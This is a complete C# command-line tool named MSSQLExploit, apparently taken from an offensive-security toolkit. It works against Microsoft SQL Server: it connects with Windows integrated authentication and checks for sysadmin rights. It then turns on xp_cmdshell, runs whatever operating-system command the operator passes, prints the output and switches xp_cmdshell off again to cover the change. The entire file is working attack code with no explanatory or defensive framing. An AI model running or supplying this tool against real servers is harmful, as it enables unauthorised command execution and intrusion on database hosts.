using System;
using System.Data.SqlClient;

namespace MSSQLExploit
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 2)
            {
                Console.WriteLine("Usage: mssql.exe <server> <command>");
                Console.WriteLine("Example: mssql.exe {{ mssql_server }} \"whoami\"");
                return;
            }

            string server = args[0];
            string command = args[1];
            string connectionString = $"Server={server};Integrated Security=true;";

            try
            {
                using (SqlConnection conn = new SqlConnection(connectionString))
                {
                    conn.Open();
                    Console.WriteLine($"[+] Connected to {server}");

                    // Check if sysadmin
                    string checkSysadmin = "SELECT IS_SRVROLEMEMBER('sysadmin')";
                    using (SqlCommand cmd = new SqlCommand(checkSysadmin, conn))
                    {
                        int isSysadmin = (int)cmd.ExecuteScalar();
                        Console.WriteLine($"[*] Sysadmin: {(isSysadmin == 1 ? "Yes" : "No")}");
                    }

                    // Enable xp_cmdshell
                    Console.WriteLine("[*] Enabling xp_cmdshell...");
                    ExecuteQuery(conn, "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;");
                    ExecuteQuery(conn, "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;");

                    // Execute command
                    Console.WriteLine($"[*] Executing: {command}");
                    string cmdQuery = $"EXEC xp_cmdshell '{command}'";
                    using (SqlCommand cmd = new SqlCommand(cmdQuery, conn))
                    {
                        using (SqlDataReader reader = cmd.ExecuteReader())
                        {
                            while (reader.Read())
                            {
                                if (!reader.IsDBNull(0))
                                {
                                    Console.WriteLine(reader.GetString(0));
                                }
                            }
                        }
                    }

                    // Disable xp_cmdshell (cleanup)
                    Console.WriteLine("[*] Disabling xp_cmdshell...");
                    ExecuteQuery(conn, "EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;");
                    ExecuteQuery(conn, "EXEC sp_configure 'show advanced options', 0; RECONFIGURE;");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error: {ex.Message}");
            }
        }

        static void ExecuteQuery(SqlConnection conn, string query)
        {
            using (SqlCommand cmd = new SqlCommand(query, conn))
            {
                cmd.ExecuteNonQuery();
            }
        }
    }
}
